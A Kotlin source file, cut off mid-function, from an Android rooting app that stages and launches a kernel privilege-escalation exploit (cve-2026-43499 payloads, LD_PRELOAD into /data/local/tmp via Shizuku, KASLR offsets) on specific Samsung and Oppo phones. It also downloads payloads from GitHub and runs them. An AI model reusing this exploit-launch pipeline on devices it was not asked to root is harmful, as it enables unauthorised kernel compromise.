package com.uniroot.app.engine

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import org.json.JSONArray
import org.json.JSONObject
import rikka.shizuku.Shizuku
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStreamReader

class RootEngine(private val context: Context) {

    private val _logLines = MutableStateFlow<List<String>>(emptyList())
    val logLines: StateFlow<List<String>> = _logLines
    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running
    private val _rooted = MutableStateFlow(false)
    val rooted: StateFlow<Boolean> = _rooted
    val profiles = mutableListOf<DeviceProfile>()
    private val prefs: SharedPreferences = context.getSharedPreferences("uniroot_prefs", Context.MODE_PRIVATE)

    private val gitHub = GitHubSupport(context)

    private companion object {
        @Volatile var crashHandlerInstalled = false
    }

    // ---------------------------------------------------------------------
    // Settings
    // ---------------------------------------------------------------------

    /** When on, the pipeline stages the latest ksud/.ko fetched from GitHub instead of the bundled ones. */
    var useLatestKsu: Boolean
        get() = prefs.getBoolean("use_latest_ksu", false)
        set(value) = prefs.edit().putBoolean("use_latest_ksu", value).apply()

    // ---- Auto-root on boot (additive only; the pipeline is untouched) ----

    var autoRootOnBoot: Boolean
        get() = prefs.getBoolean("auto_root_on_boot", false)
        set(value) = prefs.edit().putBoolean("auto_root_on_boot", value).apply()

    fun lastRunProfile(): String? {
        val name = prefs.getString("last_run_profile", null) ?: return null
        return name.takeIf { it.isNotBlank() }
    }

    fun setLastRunProfile(name: String) = prefs.edit().putString("last_run_profile", name).apply()

    fun autoRootBootCount(): Int = prefs.getInt("auto_root_boot_count", -1)

    fun setAutoRootBootCount(count: Int) = prefs.edit().putInt("auto_root_boot_count", count).apply()

    /** Home-page switch: "kernelsu" (default) or "kernelsu_next". */
    var ksuFlavor: String
        get() = prefs.getString("ksu_flavor", "kernelsu") ?: "kernelsu"
        set(value) = prefs.edit().putString("ksu_flavor", value).apply()

    fun latestKsuTag(): String = prefs.getString("latest_ksu_tag", "") ?: ""

    fun setLatestKsuTag(tag: String) = prefs.edit().putString("latest_ksu_tag", tag).apply()

    /**
     * Patched ksud for testing (e.g. the Samsung DEFEX/KDP build for the S26U):
     * off by default — the pipeline then uses the profile's validated ksud.
     */
    var usePatchedKsud: Boolean
        get() = prefs.getBoolean("use_patched_ksud", false)
        set(value) = prefs.edit().putBoolean("use_patched_ksud", value).apply()

    // IMPORTANT: stored on the EXTERNAL app dir — the Shizuku staging `cp` runs as
    // shell (uid 2000), which cannot read the app's private internal storage.
    fun patchedKsudFile(): File? =
        File(context.getExternalFilesDir(null), "ksud-test").takeIf { it.exists() }

    fun installPatchedKsud(src: File): File? = runCatching {
        val dest = File(context.getExternalFilesDir(null), "ksud-test")
        src.inputStream().use { i -> FileOutputStream(dest).use { o -> i.copyTo(o) } }
        dest.setReadable(true, false); dest.setExecutable(true, false)
        dest
    }.getOrNull()

    fun fileMd5(f: File): String = runCatching {
        val md = java.security.MessageDigest.getInstance("MD5")
        f.inputStream().use { input ->
            val buf = ByteArray(8192)
            while (true) { val n = input.read(buf); if (n < 0) break; md.update(buf, 0, n) }
        }
        md.digest().joinToString("") { "%02x".format(it) }
    }.getOrDefault("?")

    /** ksud actually staged for this run (patched test build when enabled). */
    fun ksudPathForRun(profile: DeviceProfile, quiet: Boolean = false): String {
        if (!usePatchedKsud) return profile.pathKsud
        val patched = patchedKsudFile()
        if (patched == null) {
            if (!quiet) appendLog("[!] Patched ksud enabled but no file installed — using the profile ksud.")
            return profile.pathKsud
        }
        if (!quiet) appendLog("[KernelSU] Using PATCHED ksud (test): ${patched.name} md5=${fileMd5(patched)}")
        return patched.absolutePath
    }

    // ---------------------------------------------------------------------
    // Profiles
    // ---------------------------------------------------------------------

    /**
     * Keeps the staged copies of the bundled default profiles in sync with the
     * assets: when a new APK ships updated binaries (e.g. a rebuilt ksud), the
     * staged files are refreshed in place. Existing profiles (incl. user edits)
     * are preserved — only the binary files are overwritten when they differ.
     */
    private fun refreshBundledBinaries() {
        val extDir = context.getExternalFilesDir(null) ?: return
        val mapping = mapOf(
            "s93XX" to listOf("cve.so", "kernelsu.ko", "ksud"),
            "s25-zzhl" to listOf("cve.so", "kernelsu.ko", "ksud"),
            "s25-zzi4" to listOf("cve.so", "kernelsu.ko", "ksud"),
            "s25-zzi4-classic" to listOf("cve-2026-43499", "cve-2026-43499-root"),
            "s26u-zzhk" to listOf("cve.so", "kernelsu.ko", "ksud"),
            "s93XX-next" to listOf("cve.so", "kernelsu.ko", "ksud"),
            "s25-zzhl-next" to listOf("cve.so", "kernelsu.ko", "ksud"),
            "s25-zzi4-next" to listOf("cve.so", "kernelsu.ko", "ksud"),
            "s26u-zzhk-next" to listOf("cve.so", "kernelsu.ko", "ksud"),
        )
        for ((dir, files) in mapping) {
            for (name in files) {
                runCatching {
                    val asset = "profiles/$dir/$name"
                    val staged = File(extDir, "$dir/$name")
                    if (!staged.exists()) return@runCatching
                    val aMd5 = context.assets.open(asset).use { input ->
                        val md = java.security.MessageDigest.getInstance("MD5")
                        val buf = ByteArray(8192)
                        while (true) { val n = input.read(buf); if (n < 0) break; md.update(buf, 0, n) }
                        md.digest().joinToString("") { "%02x".format(it) }
                    }
                    val sMd5 = fileMd5(staged)
                    if (aMd5 != sMd5 && aMd5 != "?") {
                        copyAssetToFile(asset, staged)
                    }
                }
            }
        }
    }

    fun initialize() {
        installCrashHandler()
        refreshBundledBinaries()
        loadProfiles()
        ensureDefaultProfiles()
        restoreRootedState()
        recoverInterruptedRuns()
        lastCrash()?.let { appendLog("[!] Previous run CRASHED (app):"); it.lineSequence().take(12).forEach { appendLog("    $it") } }
    }

    /** Nothing may die silently: app crashes land in filesDir/last_crash.txt. */
    private fun installCrashHandler() {
        if (crashHandlerInstalled) return
        crashHandlerInstalled = true
        val previous = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { t, e ->
            runCatching {
                File(context.filesDir, "last_crash.txt").writeText(
                    "thread=${t.name}\n${android.util.Log.getStackTraceString(e)}")
            }
            previous?.uncaughtException(t, e)
            android.os.Process.killProcess(android.os.Process.myPid())
        }
    }

    private fun lastCrash(): String? {
        val f = File(context.filesDir, "last_crash.txt")
        if (!f.exists()) return null
        val text = runCatching { f.readText() }.getOrDefault("")
        runCatching { f.delete() }
        return text.takeIf { it.isNotBlank() }
    }

    fun resetProfiles() { prefs.edit().remove("profiles_json").apply(); profiles.clear(); ensureDefaultProfiles() }

    fun profileByName(name: String?): DeviceProfile? = profiles.firstOrNull { it.name == name }

    fun addOrUpdateProfile(profile: DeviceProfile, originalName: String? = null) {
        val key = originalName ?: profile.name
        val index = profiles.indexOfFirst { it.name == key }
        if (index >= 0) profiles[index] = profile else profiles.add(profile)
        saveProfiles()
    }

    fun deleteProfile(name: String) {
        profiles.removeAll { it.name == name }
        saveProfiles()
    }

    fun setRunning(r: Boolean) { _running.value = r }

    private fun loadProfiles() {
        profiles.clear()
        val json = prefs.getString("profiles_json", null) ?: return
        runCatching {
            val arr = JSONArray(json)
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                profiles.add(DeviceProfile(
                    o.getString("name"), o.optString("kaslrOffset", ""),
                    o.getString("pathSo"), o.getString("pathKo"), o.getString("pathKsud"),
                    o.optString("deviceType", "samsung"),
                    o.optString("pathCveNormal", null), o.optString("pathCveRoot", null),
                    o.optString("flavor", "kernelsu")))
            }
        }
    }
    fun saveProfiles() {
        val arr = JSONArray()
        for (p in profiles) arr.put(JSONObject().apply {
            put("name", p.name); put("kaslrOffset", p.kaslrOffset); put("pathSo", p.pathSo)
            put("pathKo", p.pathKo); put("pathKsud", p.pathKsud); put("deviceType", p.deviceType)
            put("pathCveNormal", p.pathCveNormal); put("pathCveRoot", p.pathCveRoot)
            put("flavor", p.flavor)
        })
        prefs.edit().putString("profiles_json", arr.toString()).apply()
    }

    private data class DefaultSpec(
        val name: String, val flavor: String, val dir: String,
        val deviceType: String, val classic: Boolean,
    )

    /**
     * Bundled profiles (specs). Profiles are created when MISSING only, so a new
     * APK with extra profiles (e.g. the KernelSU-Next set) augments existing
     * installs without touching user-created profiles or edits.
     */
    private fun defaultSpecs() = listOf(
        DefaultSpec("S93XX (Samsung S25)", "kernelsu", "s93XX", "samsung", false),
        DefaultSpec("Oppo X9", "kernelsu", "oppo", "oppo", false),
        DefaultSpec("S25 6.6.127 ZZHL", "kernelsu", "s25-zzhl", "samsung", false),
        DefaultSpec("S25 6.6.127 ZZI4", "kernelsu", "s25-zzi4", "samsung", true),
        DefaultSpec("S26 Ultra 6.12.69 ZZHK", "kernelsu", "s26u-zzhk", "oppo", false),
        DefaultSpec("S93XX (Samsung S25) Next", "kernelsu_next", "s93XX-next", "samsung", false),
        DefaultSpec("S25 6.6.127 ZZHL Next", "kernelsu_next", "s25-zzhl-next", "samsung", false),
        DefaultSpec("S25 6.6.127 ZZI4 Next", "kernelsu_next", "s25-zzi4-next", "samsung", true),
        DefaultSpec("S26 Ultra 6.12.69 ZZHK Next", "kernelsu_next", "s26u-zzhk-next", "oppo", false),
    )

    private fun ensureDefaultProfiles() {
        val extDir = context.getExternalFilesDir(null) ?: return
        var changed = false
        for (spec in defaultSpecs()) {
            if (profiles.any { it.name == spec.name }) continue
            val dir = File(extDir, spec.dir).apply { mkdirs() }
            val so = copyAssetToFile("profiles/${spec.dir}/cve.so", File(dir, "cve.so")) ?: continue
            val ko = copyAssetFromFile("profiles/${spec.dir}/kernelsu.ko", File(dir, "kernelsu.ko")) ?: continue
            val ksud = copyAssetFromFile("profiles/${spec.dir}/ksud", File(dir, "ksud")) ?: continue
            var cn: File? = null
            var cr: File? = null
            if (spec.classic) {
                cn = copyAssetFromFile("profiles/s25-zzi4-classic/cve-2026-43499", File(dir, "cve-classic"))
                cr = copyAssetFromFile("profiles/s25-zzi4-classic/cve-2026-43499-root", File(dir, "cve-root"))
            }
            profiles.add(DeviceProfile(
                spec.name, "", so.absolutePath, ko.absolutePath, ksud.absolutePath,
                spec.deviceType, cn?.absolutePath, cr?.absolutePath, spec.flavor))
            changed = true
        }
        if (changed) saveProfiles()
    }

    private fun copyAssetFromFile(assetPath: String, destFile: File): File? =
        copyAssetToFile(assetPath, destFile)

    fun copyAssetToFile(assetPath: String, destFile: File): File? {
        return try {
            context.assets.open(assetPath).use { i -> FileOutputStream(destFile).use { o -> i.copyTo(o) } }
            destFile.setReadable(true, false); destFile.setExecutable(true, false); destFile
        } catch (e: Exception) { null }
    }

    // ---------------------------------------------------------------------
    // Rooted state (live: this boot only — an LKM late-load root does NOT
    // survive a reboot, so the persisted flag is never trusted for display)
    // ---------------------------------------------------------------------

    private fun restoreRootedState() {
        _rooted.value = ksuModuleLoaded()
    }

    fun refreshRootedLive() {
        _rooted.value = ksuModuleLoaded()
    }

    fun markRooted(profileName: String) {
        val set = prefs.getStringSet("rooted_profiles", emptySet()).orEmpty().toMutableSet()
        set.add(profileName)
        prefs.edit().putStringSet("rooted_profiles", set).apply()
        profileByName(profileName)?.let { prefs.edit().putString("loaded_flavor", it.flavor).apply() }
        _rooted.value = true
    }

    /** Flavor of the KernelSU module currently loaded (recorded at root time) — used by auto-root. */
    fun loadedKsuFlavor(): String? = prefs.getString("loaded_flavor", null)






    fun clearRootedFlag() {
        prefs.edit().remove("rooted_profiles").apply()
        _rooted.value = false
    }

    fun ksuModuleLoaded(): Boolean = runCatching {
        File("/proc/modules").readText().lineSequence().any { it.startsWith("kernelsu ") }
    }.getOrDefault(false)

    // ---------------------------------------------------------------------
    // Run logs (Root My Galaxy style boxes, shareable .txt)
    // ---------------------------------------------------------------------

    // ------------------------------------------------------------------
    // Run logs: RMG-style persistence. The box exists from the START of the
    // run ("Running") and every log line is appended live, so a crash or an
    // unexpected reboot still leaves a complete Failed box behind.
    // ------------------------------------------------------------------

    private var activeRunStamp: String? = null
    private var activeRunProfile: String = ""

    private val runLogsDir: File get() = File(context.filesDir, "run-logs").apply { mkdirs() }

    private fun stampNow(): String =
        java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.US).format(java.util.Date())

    private fun runLogFile(stamp: String, status: String): File =
        File(runLogsDir, "${stamp}_${status.replace(Regex("[^A-Za-z]"), "-")}.txt")

    private fun runLogHeader(stamp: String, status: String, profileName: String, durationMs: Long): String = buildString {
        val info = detectDevice()
        appendLine("Uni-Root run log")
        appendLine("Date:     ${stamp.replace('_', ' ')}")
        appendLine("Result:   $status")
        appendLine("Duration: ${durationMs / 1000}s")
        appendLine("Profile:  $profileName")
        appendLine("Device:   ${info.model}")
        appendLine("Kernel:   ${info.kernel}")
        appendLine("==========================================")
    }

    fun beginRunLog(profileName: String) {
        val stamp = stampNow()
        activeRunStamp = stamp
        activeRunProfile = profileName
        runCatching { runLogFile(stamp, "Running").writeText(runLogHeader(stamp, "Running", profileName, 0)) }
    }

    private fun appendToActiveRunLog(lines: List<String>) {
        val stamp = activeRunStamp ?: return
        runCatching { runLogFile(stamp, "Running").appendText(lines.joinToString("\n", postfix = "\n")) }
    }

    fun endRunLog(status: String, profileName: String, durationMs: Long) {
        val stamp = activeRunStamp
        activeRunStamp = null
        runCatching {
            stamp?.let { runLogFile(it, "Running").delete() }
            val finalStamp = stamp ?: stampNow()
            runLogFile(finalStamp, status).writeText(
                runLogHeader(finalStamp, status, profileName, durationMs) + _logLines.value.joinToString("\n") + "\n")
            // keep the 30 most recent boxes only
            runLogsDir.listFiles { f -> f.extension == "txt" }?.sortedByDescending { it.name }?.drop(30)?.forEach { it.delete() }
        }
    }

    /** Fallback for exceptions thrown outside the pipeline: no duplicate box. */
    fun abandonActiveRunLog() {
        val stamp = activeRunStamp ?: return
        activeRunStamp = null
        endRunLog("Failed", activeRunProfile, 0)
        runCatching { runLogFile(stamp, "Running").delete() }
    }

    /** Root My Galaxy closeInterruptedRuns: a box left "Running" means a crash/reboot. */
    fun recoverInterruptedRuns() {
        runCatching {
            runLogsDir.listFiles { f -> f.name.endsWith("_Running.txt") }?.forEach { f ->
                val stamp = f.name.substringBeforeLast('_')
                val content = f.readText().replaceFirst("Result:   Running", "Result:   Failed (interrupted)")
                if (f.delete()) File(runLogsDir, "${stamp}_Failed-Interrupted.txt").writeText(content)
            }
        }
    }

    fun listRunLogs(): List<RunLogFile> = runCatching {
        val dir = File(context.filesDir, "run-logs")
        val fmt = java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.US)
        dir.listFiles { f -> f.extension == "txt" }.orEmpty()
            .sortedByDescending { it.name }
            .mapNotNull { f ->
                val stamp = f.name.substringBeforeLast('_')
                val status = f.name.substringAfterLast('_').removeSuffix(".txt")
                val time = runCatching { fmt.parse(stamp)?.time }.getOrNull() ?: f.lastModified()
                RunLogFile(f, time, status)
            }
    }.getOrDefault(emptyList())

    fun deleteRunLog(file: File) { runCatching { file.delete() } }

    // ---------------------------------------------------------------------
    // Root My Galaxy remote support
    // ---------------------------------------------------------------------

    /**
     * Talks to the Root My Galaxy GitHub (support feed), matches this device and,
     * on a hit, downloads the official payloads and registers them as a profile.
     * Returns a user-facing status line.
     */
    suspend fun checkRootMyGalaxy(): String = withContext(Dispatchers.IO) {
        try {
            val info = detectDevice()
            val targets = gitHub.fetchRmgTargets()
            val kernelVersion = gitHub.kernelThreePart(info.kernel)
            val target = gitHub.matchRmgTarget(targets, info.model, kernelVersion)
            if (target == null) {
                "Root My Galaxy: no supported payload for ${info.model} / $kernelVersion (${targets.size} targets online)"
            } else {
                val existing = profileByName("RMG · ${target.displayName}")
                val profile = gitHub.downloadRmgProfile(target)
                addOrUpdateProfile(profile, if (existing != null) profile.name else null)
                if (existing == null) appendLog("[RootMyGalaxy] New profile from GitHub: ${profile.name}")
                "Root My Galaxy: matched ${target.displayName} — payload downloaded and ready"
            }
        } catch (e: Exception) {
            "Root My Galaxy: offline (${e.message})"
        }
    }

    // ---------------------------------------------------------------------
    // KernelSU / KernelSU Next latest binaries
    // ---------------------------------------------------------------------

    /**
     * Fetches the latest ksud + prebuilt .ko for the running kernel KMI from the
     * selected flavor's GitHub releases, into [profile]'s directory. The files are
     * only used when the "latest from GitHub" option is enabled.
     */
    suspend fun fetchLatestKsuFor(profile: DeviceProfile): String = withContext(Dispatchers.IO) {
        try {
            val kmi = gitHub.kmiFromKernel(detectDevice().kernel)
            require(kmi.isNotEmpty()) { "Cannot read the kernel KMI" }
            val destDir = File(profile.pathKsud).parentFile ?: context.filesDir
            val latest = gitHub.fetchLatestKsu(kmi, destDir) { appendLog(it) }
            setLatestKsuTag(latest.tag)
            "Downloaded KernelSU ${latest.tag} for $kmi"
        } catch (e: Exception) {
            "Download failed: ${e.message}"
        }
    }

    fun latestKsuFilesFor(profile: DeviceProfile): Pair<File, File>? {
        val dir = File(profile.pathKsud).parentFile ?: return null
        val ksud = File(dir, "ksud-kernelsu-latest")
        if (!ksud.exists()) return null
        val ko = File(dir, "kernelsu-kernelsu-latest.ko")
        return ksud to if (ko.exists()) ko else File(profile.pathKo)
    }

    // ---------------------------------------------------------------------
    // KernelSU manager app (external): force-stop + relaunch after a run
    // ---------------------------------------------------------------------

    fun isKsuManagerInstalled(next: Boolean = false): Pair<Boolean, String> {
        val packages = if (next) listOf("com.rifsxd.ksunext", "com.rifsxd.ksunext.debug")
        else listOf("me.weishu.kernelsu", "me.weishu.kernelsu.pr")
        for (pkg in packages) {
            if (runCatching { context.packageManager.getPackageInfo(pkg, 0) }.isSuccess) return true to pkg
        }
        return false to ""
    }

    /** Kills a stale manager so it re-reads the freshly loaded module (shell can force-stop). */
    suspend fun forceStopKsuManager(pkg: String): Boolean = withContext(Dispatchers.IO) {
        if (!shizukuBinderActive() || !shizukuPermissionGranted()) return@withContext false
        runDiagnosticCommand("am force-stop $pkg", true) == 0
    }

    /** Launches the manager via the Shizuku shell — reliable even from background. */
    suspend fun startManagerViaShizuku(pkg: String, activity: String): Boolean = withContext(Dispatchers.IO) {
        if (!shizukuBinderActive() || !shizukuPermissionGranted()) return@withContext false
        runDiagnosticCommand("am start -n $pkg/$activity", true) == 0
    }

    // ---------------------------------------------------------------------
    // Logs
    // ---------------------------------------------------------------------

    fun appendLog(msg: String) {
        if (msg.isBlank()) return
        // GhostLock-style: one entry per line so each line carries its own tone.
        val lines = msg.lineSequence().filter { it.isNotBlank() }.toList()
        if (lines.isEmpty()) return
        _logLines.value = _logLines.value + lines
        runCatching { File(context.filesDir, "current_run.log").appendText(lines.joinToString("\n", postfix = "\n")) }
        appendToActiveRunLog(lines)
    }

    fun clearLogs() { _logLines.value = emptyList(); runCatching { File(context.filesDir, "current_run.log").delete() } }

    // ---------------------------------------------------------------------
    // Device / Shizuku
    // ---------------------------------------------------------------------

    fun detectDevice(): DeviceInfo {
        val model = Build.MODEL ?: ""
        val incremental = Build.VERSION.INCREMENTAL ?: ""
        val kernel = runCatching { File("/proc/version").readText() }.getOrDefault("")
            .substringAfter("Linux version ", "").substringBefore(" (").trim()
        val matched: String? = when {
            model.startsWith("SM-S948") && kernel.contains("6.12.69") -> "S26 Ultra 6.12.69 ZZHK"
            model.startsWith("SM-S931") && kernel.contains("6.6.127") && incremental.contains("ZZI4") -> "S25 6.6.127 ZZI4"
            model.startsWith("SM-S931") && kernel.contains("6.6.127") && incremental.contains("ZZHL") -> "S25 6.6.127 ZZHL"
            else -> null
        }
        val soc = when {
            model.startsWith("SM-S948") -> "Snapdragon 8 Elite Gen 5"
            model.startsWith("SM-S93") -> "Snapdragon 8 Elite"
            else -> "-"
        }
        return DeviceInfo(model, kernel.ifEmpty { incremental }, soc, matched)
    }

    fun shizukuBinderActive(): Boolean = runCatching { Shizuku.pingBinder() }.getOrDefault(false)
    fun shizukuPermissionGranted(): Boolean = runCatching {
        Shizuku.checkSelfPermission() == android.content.pm.PackageManager.PERMISSION_GRANTED
    }.getOrDefault(false)
    fun requestShizukuPermission() { runCatching { Shizuku.requestPermission(0) } }

    // Watchdog réel : withTimeoutOrNull n'interrompt PAS un readLine()/waitFor()
    // bloqué sur un thread — toute commande Shizuku doit avoir un timeout qui
    // détruit le processus et rend la main, sinon le pipeline gèle en silence.
    suspend fun runDiagnosticCommand(cmd: String, useShizuku: Boolean): Int = withContext(Dispatchers.IO) {
        try {
            val p = newShellProcess(cmd, useShizuku)
            val ok = p.waitFor(20, java.util.concurrent.TimeUnit.SECONDS)
            if (!ok) { appendLog("[!] Command timed out: ${cmd.take(80)}"); p.destroyForcibly(); -2 } else 0
        } catch (e: Exception) { appendLog("[!] Command failed: ${e.javaClass.simpleName} ${cmd.take(60)}"); -1 }
    }

    suspend fun executeCommandAndReturnOutput(cmd: String, useShizuku: Boolean): String = withContext(Dispatchers.IO) {
        try {
            val p = newShellProcess(cmd, useShizuku)
            val sb = StringBuilder()
            val reader = Thread {
                runCatching {
                    BufferedReader(InputStreamReader(p.inputStream)).use { r ->
                        var l: String?
                        while (r.readLine().also { l = it } != null) {
                            synchronized(sb) { sb.append(l).append('\n') }
                        }
                    }
                }
            }.apply { isDaemon = true; start() }
            val finished = p.waitFor(20, java.util.concurrent.TimeUnit.SECONDS)
            if (!finished) { appendLog("[!] Output command timed out: ${cmd.take(80)}"); p.destroyForcibly() }
            reader.join(2_000)
            synchronized(sb) { sb.toString() }
        } catch (e: Exception) { appendLog("[!] Output command failed: ${e.javaClass.simpleName}"); "" }
    }

    private fun newShellProcess(cmd: String, useShizuku: Boolean): Process {
        if (!useShizuku) {
            return ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start()
        }
        // The public Shizuku API has NO Shizuku.newProcess — the process service is
        // only exposed through the IShizukuService AIDL (dev.rikka.shizuku:aidl).
        // The old reflection silently threw IllegalArgumentException, which is why
        // the S26 never ran through Shizuku.
        val binder = Shizuku.getBinder()
            ?: throw IllegalStateException("Shizuku binder is null (server not running?)")
        val service = moe.shizuku.server.IShizukuService.Stub.asInterface(binder)
        val remote = service.newProcess(arrayOf("sh", "-c", cmd), null, null)
        return ShizukuProcessAdapter(remote)
    }


    suspend fun runExecutionPipeline(rawProfile: DeviceProfile, useShizukuParam: Boolean): String {
        appendLog("==========================================")
        appendLog("[Pipeline] Start for \"${rawProfile.name}\"")
        val runStartedAt = System.currentTimeMillis()
        beginRunLog(rawProfile.name)

        var profile = rawProfile

        // Un module KernelSU déjà chargé (root classic réussi plus tôt dans ce
        // boot) laisse ses hooks syscall actifs : ils faussent la course
        // pselect/futex du payload, qui rate alors sa fenêtre d'écriture.
        // Tester un profil Next exige un boot vierge.
        if (ksuModuleLoaded()) {
            appendLog("[!] Module KernelSU déjà chargé sur ce boot (root déjà actif).")
            appendLog("[!] Ses hooks syscall faussent la course du payload.")
            appendLog("[!] Pour tester proprement ce profil : REBOOTE d'abord, puis relance.")
        }

        // Profil Samsung sans fichiers avancés : SEUL le mode Local est validé
        // (helper --run-payload + oracle physique). On ignore le toggle Shizuku.
        var useShizuku = useShizukuParam
        if (profile.name.startsWith("S26")) useShizuku = true
        if (useShizuku && profile.deviceType == "samsung" && profile.pathCveNormal.isNullOrEmpty()) {
            appendLog("[Mode] Mode Local validé pour ce profil (Shizuku ignoré)")
            useShizuku = false
        }

        // Option "latest from GitHub" : remplacer ksud/.ko embarqués par les
        // dernières versions officielles KernelSU (déconseillé). Sans elle, on
        // utilise les fichiers du profil — testés et prévus pour KernelSU.
        if (useLatestKsu && profile.pathKsud.isNotEmpty()) {
            var files = latestKsuFilesFor(profile)
            if (files == null) {
                appendLog("[KernelSU] Downloading latest KernelSU binaries from GitHub...")
                val res = fetchLatestKsuFor(profile)
                appendLog("[KernelSU] $res")
                files = latestKsuFilesFor(profile)
            }
            if (files != null) {
                appendLog("[KernelSU] Using latest KernelSU binaries (${latestKsuTag()}): ${files.first.name} + ${files.second.name}")
                profile = profile.copy(pathKsud = files.first.absolutePath, pathKo = files.second.absolutePath)
            } else {
                appendLog("[!] Latest binaries unavailable — falling back to the bundled profile files.")
            }
        }

        // IMPORTANT : plus de cache KASLR automatique. Le slide change à CHAQUE boot :
        // réutiliser un offset périmé après un crash/redémarrage = écritures noyau
        // dans le vide = panic en boucle. Seul un offset saisi manuellement est utilisé.
        prefs.edit().remove("kaslr_cache_" + profile.name).apply()
        val kaslr = profile.kaslrOffset
        if (kaslr.isNotEmpty()) appendLog("[KASLR] Forced Offset : $kaslr (manuel)")

        var process: Process? = null
        var success = false
        var finalStatus = "Crash"
        
        try {
            if (useShizuku) {
                // --- MODE SHIZUKU (Utilisation d'un fichier de log pour ne pas casser l'exploit) ---
                appendLog("[Shizuku] Sanity check (id)…")
                val sanity = executeCommandAndReturnOutput("id; echo rc=\$?", true)
                appendLog("[Shizuku] ${sanity.ifBlank { "NO OUTPUT — Shizuku command channel is broken" }}")
                val logFilePath = "/data/local/tmp/exploit.log"
                runDiagnosticCommand("kill -9 \$(cat /data/local/tmp/exploit.pid) 2>/dev/null; rm -f $logFilePath /data/local/tmp/exploit.pid", true)
                val probeLocal = File(context.getExternalFilesDir(null), "pipeprobe")
                try { context.assets.open("profiles/s26u-zzhk/pipeprobe").use { i -> FileOutputStream(probeLocal).use { o -> i.copyTo(o) } } } catch (_: Exception) {}
                if (probeLocal.exists()) {
                    appendLog("[Probe] Staging pipeprobe…")
                    val cpProbe = runDiagnosticCommand("cp ${probeLocal.absolutePath} /data/local/tmp/pipeprobe && chmod 755 /data/local/tmp/pipeprobe", true)
                    if (cpProbe != 0) appendLog("[Probe] Could not stage pipeprobe (rc=$cpProbe) — continuing")
                    val probeOut = executeCommandAndReturnOutput("/data/local/tmp/pipeprobe 2>&1; echo; id; grep -E ^Seccomp|^NoNewPrivs /proc/self/status", true)
                    appendLog("[Probe] ${probeOut.ifBlank { "no output" }}")
                }

                var launchCmd = ""
                // Le payload v10 du S26 est probabiliste : l'hôte peut mourir en
                // pleine course (SIGSEGV userspace) sans que le kernel plante.
                // Sur PC on relance la commande à la main — l'app fait pareil.
                // Data from run boxes: attempt 1 always fails by design, attempt 2+
                // finds the slide, and the probabilistic physrw establishment is
                // ~50/50 per RUN. After a failed run the state clears in ~1 min
                // (proven: Failed at 00:28 -> Success at 00:29 same boot), so the
                // app chains full payload relaunches instead of asking the user
                // to manually re-run — and stops if the pipe budget runs out.
                val maxRelaunches = 2
                var relaunches = 0
                if (profile.deviceType == "samsung" && !profile.pathCveNormal.isNullOrEmpty() && !profile.pathCveRoot.isNullOrEmpty()) {
                    appendLog("[Shizuku] Copying advanced CVEs to /data/local/tmp/...")
                    val cveNormalPath = "/data/local/tmp/cve-2026-43499"
                    val cveRootPath = "/data/local/tmp/cve-2026-43499-root"
                    
                    runDiagnosticCommand("cp ${profile.pathCveNormal} $cveNormalPath && cp ${profile.pathCveRoot} $cveRootPath && chmod 755 $cveNormalPath $cveRootPath", true)
                    runDiagnosticCommand("cp ${ksudPathForRun(profile)} /data/local/tmp/ksud && cp ${profile.pathKo} /data/local/tmp/kernelsu.ko && chmod 755 /data/local/tmp/ksud", true)
                    
                    appendLog("[Exploit] Launching via LD_PRELOAD (Shell UID 2000)...")
                    launchCmd = "LD_PRELOAD=$cveNormalPath /system/bin/true > $logFilePath 2>&1 &"
                } else {
                    appendLog("[Shizuku] Copying to /data/local/tmp/...")
                    val ksudForRun = ksudPathForRun(profile)
                    val isNext = profile.flavor == "kernelsu_next"
                    if (isNext) {
                        appendLog("[KernelSU] Next ksud is all-in-one (embedded module) — no external .ko staged.")
                        if (profile.name.startsWith("S25") || profile.name.startsWith("S93")) {
                            appendLog("[KernelSU] S25 Next: custom KDP build (no-patch-text + kprobe fallback).")
                            appendLog("[KernelSU] Its embedded android15-6.6 module is the fixed Next build:")
                            appendLog("[KernelSU] dispatcher failure now fails closed — Samsung fallback hooks engage.")
                        }
                    }
                    val koStage = if (isNext) "" else "cp ${profile.pathKo} /data/local/tmp/kernelsu.ko && "
                    val stageRc = runDiagnosticCommand("cp ${profile.pathSo} /data/local/tmp/cve.so && cp /data/local/tmp/cve.so /data/local/tmp/preload.so && $koStage" +
                        "cp $ksudForRun /data/local/tmp/ksud && chmod 755 /data/local/tmp/cve.so /data/local/tmp/preload.so /data/local/tmp/ksud", true)
                    val staged = executeCommandAndReturnOutput("ls -la /data/local/tmp/cve.so /data/local/tmp/preload.so /data/local/tmp/ksud 2>&1; md5sum /data/local/tmp/ksud 2>/dev/null", true)
                    appendLog("[Shizuku] Stage rc=$stageRc; files:\n${staged.ifBlank { "NOT VISIBLE — copy failed?" }}")

                    // Le build APP du payload exige CVE43499_ROOT_HELPER (chemin absolu
                    // du helper exécuté en root via umh) — cf. root.c:140. Sans lui :
                    // échec propre "root umh missing CVE43499_ROOT_HELPER".
                    val helperCmd = if (!profile.pathCveRoot.isNullOrEmpty()) {
                        runDiagnosticCommand("cp ${profile.pathCveRoot} /data/local/tmp/cve-2026-43499-root && chmod 755 /data/local/tmp/cve-2026-43499-root", true)
                        "CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root "
                    } else ""

                    appendLog("[Pre-check] Pipe limits and leftover cleanup...")
                    val pipeInfo = executeCommandAndReturnOutput("echo pipe-max-size=\$(cat /proc/sys/fs/pipe-max-size); echo pipe-soft=\$(cat /proc/sys/fs/pipe-user-pages-soft); echo pipe-hard=\$(cat /proc/sys/fs/pipe-user-pages-hard); echo id=\$(id); echo fcntl-test:\$(LD_PRELOAD= /system/bin/sh -c 'exec 3<>/dev/null; echo test')", true)
                    if (pipeInfo.isNotBlank()) appendLog("[Pre-check] $pipeInfo")
